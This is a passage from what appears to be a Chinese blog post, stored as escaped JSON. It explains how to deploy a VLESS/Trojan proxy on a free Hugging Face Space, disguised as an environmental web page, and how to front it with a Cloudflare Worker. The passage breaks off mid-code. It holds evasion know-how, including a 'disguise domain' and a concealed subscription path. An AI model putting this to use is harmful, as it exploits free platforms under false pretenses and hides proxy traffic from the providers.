if(targetElement) { window.scrollTo({ top: targetElement.offsetTop - 80, behavior: \u0026#39;smooth\u0026#39; }); document.querySelector(\u0026#39;nav ul\u0026#39;).classList.remove(\u0026#39;active\u0026#39;); } }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 那就一切完工，看下都有什么文件：\n一切就绪，点击App运行：\n那会看到运行完毕，开了7860这个端口\n那直接点击左上的myhome链接，就能看到环保页面了。\n那大善人huggingface就弄好了。\n解释一下具体原理：\nhuggingface 跑了个前置的Nginx代理，自动申请了证书，代理后端容器的7860端口，为什么是7860端口呢？\n因为最常见的用途是托管基于 Gradio 构建的机器学习模型演示。Gradio 是一个非常流行的 Python 库，用于快速创建交互式 Web 界面来展示 ML 模型。它的默认启动端口就是7860。\n那接着我们去薅大善人cloudflare，首先弄好一个域名并托管到CF上面，比如免费的qzz.io\n点开左边的菜单：Build \u0026ndash;\u0026gt; Compute \u0026amp; AI \u0026ndash;\u0026gt; Workers \u0026amp; Pages\n新建一个应用，Create application\n然后选 Start with Hello World！\n然后就会建出一个来，点击编辑代码，Edit Code\n我们把以下代码贴进去，注意修改域名，只写域名，没有https的前缀，从huggingface得到的免费域名：\n把代码中username-spacename.hf.space换成自己的域名\nexport default { async fetch(request, env) { let url = new URL(request.url); if (url.pathname.startsWith(\u0026#39;/\u0026#39;)) { var arrStr = [ \u0026#39;username-spacename.hf.space\u0026#39;, // 此处单引号里填写你的节点伪装域名 ]; url.protocol = \u0026#39;https:\u0026#39; url.hostname = getRandomArray(arrStr) let new_request = new Request(url, request); return fetch(new_request); } return env.ASSETS.fetch(request); }, }; function getRandomArray(array) { const randomIndex = Math.floor(Math.random() * array.length); return array[randomIndex]; } 然后点 Deploy ，部署\n返回这个worker的空间，点击Settings，下面的Domains \u0026amp; Routes ，右边点击 +Add\n弹出的对话框，选择Custom domain\n然后填入自己心满意足的域名\n点击Add domain就完事了。\n然后我们打开我们心满意足的域名：\n环保页面，然后打开我们的订阅页面，缺省是/sub，当然改成只有自己知道的路径为好\n出现订阅的Base64字符就ok了。\n我们用v2rayN导入即可。\n完工，还是说一下原理：\n利用cf大善人的网络代理加速，利用hug大善人的免费域名和证书，达到我们的目的\n最后，这个的index.js和上一篇的不同啊，唯一区别就是端口，hug端口肯定是443，而wispbyte的端口是非标的。\n注意注意！！！\n","permalink":"https://rendoumi.com/posts/20260106-huggingface_vless_trojan/","summary":"\u003cp\u003e应佬友的要求再出一篇文章，前面薅了wispbyte.com的羊毛，但是吧容器比较弱小，强一点的就是huggingface.co的容器：\u003c/p\u003e\n\u003cp\u003eFree版本就是2vCPU和16GB RAM，就已经非常强了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260106092514521\" loading=\"lazy\" src=\"/posts/20260106-huggingface_vless_trojan/image-20260106092514521.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那先介绍一下huggingface，其实这是一家非常强悍的公司，可以称作是“AI界的GitHub”，可以分享模型，数据集，然后演示应用。\u003c/p\u003e\n\u003cp\u003e我们用到的就是这个演示应用（Spaces）\u003c/p\u003e\n\u003cp\u003e首先注册好账号，然后右上角点击头像按钮，新建一个Space\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260106104401915\" loading=\"lazy\" src=\"/posts/20260106-huggingface_vless_trojan/image-20260106104401915.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后填入必须项\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSpace name：就写myhome\u003c/li\u003e\n\u003cli\u003eShort description：Save Our Home\u003c/li\u003e\n\u003cli\u003eLicense：MIT\u003c/li\u003e\n\u003cli\u003eSDK：选择Docker\u003c/li\u003e\n\u003cli\u003eDocker template: 选择Blank\u003c/li\u003e\n\u003cli\u003eSpace hardware：选择Free\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260106104916165\" loading=\"lazy\" src=\"/posts/20260106-huggingface_vless_trojan/image-20260106104916165.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其它都不选，最后CreateSpace即可\u003c/p\u003e\n\u003cp\u003e然后就建好了，其实是给你开了一个git的repo\u003c/p\u003e\n\u003cp\u003e我们到右上角，选择Files选项\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260106105206257\" loading=\"lazy\" src=\"/posts/20260106-huggingface_vless_trojan/image-20260106105206257.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后打开的文件页面，只有两个文件\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260106105253425\" loading=\"lazy\" src=\"/posts/20260106-huggingface_vless_trojan/image-20260106105253425.png\"\u003e\u003c/p\u003e\n\u003cp\u003e老套路，建立一个Dockerfile文件，就是容器的打包文件\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260106105349755\" loading=\"lazy\" src=\"/posts/20260106-huggingface_vless_trojan/image-20260106105349755.png\"\u003e\u003c/p\u003e\n\u003cp\u003eDockerfile的内容，编辑好，然后提交，注意：Linux有严格的大小写要求，务必遵守\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFROM nikolaik/python-nodejs:python3.14-nodejs22\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eWORKDIR /tmp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCOPY index.js /tmp/index.js\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCOPY package.json /tmp/package.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCOPY index.html /tmp/index.html\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCMD npm install \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e node index.js\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260106114337260\" loading=\"lazy\" src=\"/posts/20260106-huggingface_vless_trojan/image-20260106114337260.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后我们把index.js准备好，需要修改几个地方\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ehttp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;http\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ehttps\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003efs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;fs\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eaxios\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;axios\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003enet\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;net\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003epath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;path\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ecrypto\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;crypto\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"o\"\u003e{\u003c/span\u003e Buffer \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;buffer\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"o\"\u003e{\u003c/span\u003e WebSocket, createWebSocketStream \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ws\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// 生成 UUID v4\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e generateUUID\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e crypto.randomUUID\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.UUID \u003cspan class=\"o\"\u003e||\u003c/span\u003e generateUUID\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.DOMAIN \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;1234.abc.com\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e       // 填写项目域名\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eWSPATH\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.WSPATH \u003cspan class=\"o\"\u003e||\u003c/span\u003e UUID.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 8\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e     // 节点路径，默认获取uuid前8位\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eSUB_PATH\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.SUB_PATH \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;sub\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e            // 获取节点的订阅路径\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eNAME\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.NAME \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e                       // 节点名称\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ePORT\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.PORT \u003cspan class=\"o\"\u003e||\u003c/span\u003e 7860\u003cspan class=\"p\"\u003e;\u003c/span\u003e                     // http和ws服务端口\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eTLS_KEY_PATH\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.TLS_KEY_PATH \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;tls.key\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eTLS_CERT_PATH\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e process.env.TLS_CERT_PATH \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;tls.crt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003eISP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eGetISP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e async \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003eres\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await axios.get\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://api.ip.sb/geoip\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e res.data\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eISP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.country_code\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e-\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.isp\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e.replace\u003cspan class=\"o\"\u003e(\u003c/span\u003e/ /g, \u003cspan class=\"s1\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003ee\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eISP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Unknown\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetISP\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e normalizeSecret\u003cspan class=\"o\"\u003e(\u003c/span\u003evalue\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!value\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e value.includes\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e ? value.replace\u003cspan class=\"o\"\u003e(\u003c/span\u003e/\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003en/g, \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e : value\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e readOptionalFile\u003cspan class=\"o\"\u003e(\u003c/span\u003efilePath\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!filePath\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eresolvedPath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e path.isAbsolute\u003cspan class=\"o\"\u003e(\u003c/span\u003efilePath\u003cspan class=\"o\"\u003e)\u003c/span\u003e ? filePath : path.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e__dirname, filePath\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e fs.readFileSync\u003cspan class=\"o\"\u003e(\u003c/span\u003eresolvedPath, \u003cspan class=\"s1\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003eerror\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    console.warn\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003eFailed to \u003cspan class=\"nb\"\u003eread\u003c/span\u003e TLS file \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eresolvedPath\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e: \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e.message\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e getTLSOptions\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e normalizeSecret\u003cspan class=\"o\"\u003e(\u003c/span\u003eprocess.env.TLS_KEY\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ecert\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e normalizeSecret\u003cspan class=\"o\"\u003e(\u003c/span\u003eprocess.env.TLS_CERT\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!key\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e readOptionalFile\u003cspan class=\"o\"\u003e(\u003c/span\u003eTLS_KEY_PATH\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!cert\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ecert\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e readOptionalFile\u003cspan 